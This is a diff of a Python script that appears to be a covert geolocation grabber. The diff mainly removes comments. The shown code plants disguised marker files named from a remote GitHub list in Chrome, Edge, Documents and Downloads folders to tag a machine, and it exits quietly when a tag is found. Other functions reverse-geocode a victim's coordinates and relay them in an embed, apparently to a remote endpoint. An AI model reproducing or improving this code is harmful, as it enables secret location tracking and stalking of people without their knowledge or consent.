@@ -26,43 +26,28 @@ def tracker_check():
     appdata_path = os.getenv('APPDATA')
     local_path = os.path.join(os.getenv('LOCALAPPDATA'), 'wpa', 'dpf', 'fname')
     roaming_microsoft_path = os.path.join(appdata_path, 'Roaming', 'Microsoft', 'services')
-
     chrome_data_path = os.path.join(local_path, 'Google', 'Chrome', 'User Data')
     chrome_cache_path = os.path.join(local_path, 'Google', 'Chrome', 'User Data', 'Default', 'Cache')
     chrome_extension_path = os.path.join(local_path, 'Google', 'Chrome', 'User Data', 'Default', 'Extensions')
-
     microsoft_edge_path = os.path.join(local_path, 'Microsoft', 'Edge', 'User Data')
     microsoft_edge_cache_path = os.path.join(local_path, 'Microsoft', 'Edge', 'User Data', 'Default', 'Cache')
-
     microsoft_services_path = os.path.join(appdata_path, 'Roaming', 'Microsoft', 'services')
-
-    # Application-specific paths for a custom application, e.g., WPA (Windows Performance Analyzer)
     wpa_data_path = os.path.join(local_path, 'wpa', 'dpf', 'fname')
-
-    # User's Documents and Downloads for storage
     user_documents_path = os.path.join(os.getenv('USERPROFILE'), 'Documents')
     user_downloads_path = os.path.join(os.getenv('USERPROFILE'), 'Downloads')
-
-    # Example for creating paths for "services" like Chrome or Microsoft might have
     microsoft_app_data_path = os.path.join(appdata_path, 'Roaming', 'Microsoft', 'AppData', 'services', 'chrome_service')
-
-    # Temporary and other custom folders
     temp_data_path = os.path.join(local_path, 'Temp', 'user_temp_folder')
     custom_log_path = os.path.join(local_path, 'mloc', 'logs', 'logfile')
 
-    # Fetch the list of filenames from the given URL
     url = 'https://raw.githubusercontent.com/Synthiny/GeoSleuth/refs/heads/main/html/fname.html'
     response = requests.get(url)
     
-    # Ensure the response is successful (status code 200)
     if response.status_code != 200:
         print(f"Failed to retrieve file names. HTTP Status: {response.status_code}")
         return
 
-    # Split the response content into filenames (assuming they are separated by newlines)
     file_names = response.text.strip().splitlines()
 
-    # Check and create files in the specified directories
     directories = [
                     chrome_data_path,
                     chrome_cache_path,
@@ -79,11 +64,9 @@ def tracker_check():
                 ]
     
     for dir_path in directories:
-        # Check if the directory exists, if not, create it
         if not os.path.exists(dir_path):
             os.makedirs(dir_path)
 
-        # Check if any of the files exist in the current directory
         file_exists = False
         for file_name in file_names:
             file_path = os.path.join(dir_path, file_name)
@@ -91,20 +74,17 @@ def tracker_check():
                 file_exists = True
                 break
 
-        # If no file exists, select a random file from the list and create it
         if not file_exists:
             file_name = random.choice(file_names)
             file_path = os.path.join(dir_path, file_name)
-
-            # Create the file
             with open(file_path, 'w') as f:
-                f.write("")  # Just create an empty file
+                f.write("")
 
             if SELF_DEBUG == True:
-                print(f"File {file_name} has been created at {file_path}.")
+                print(f"[TRACKER] - File {file_name} has been created at {file_path}.")
         else:
             if SELF_DEBUG == True:
-                print(f"One of the files already exists in {dir_path}. Exiting...")
+                print(f"[TRACKER] Detected tracker file - {dir_path}. Exiting...")
 
             os._exit(0)
 
@@ -136,7 +116,6 @@ def reverse_geocode(latitude, longitude):
     except requests.exceptions.RequestException as e:
         if SELF_DEBUG == True:debug(f"Error during geocoding: {e}")
         return None
-
 
 def relay(CLIENT_LATITUDE, CLIENT_LONGITUDE, CLIENT_ACCURACY, CLIENT_ILA):
     embed = {
@@ -232,7 +211,14 @@ def start():
         relay(CLIENT_LATITUDE, CLIENT_LONGITUDE, CLIENT_ACCURACY, CLIENT_ILA)
     driver.quit()
 
-
 if __name__ in "__main__":
     os.chdir(os.path.dirname(os.path.abspath(__file__)))
     start()
+
+
+"""
+yes
+i know
+this code sucks
+im new to this ok
+"""
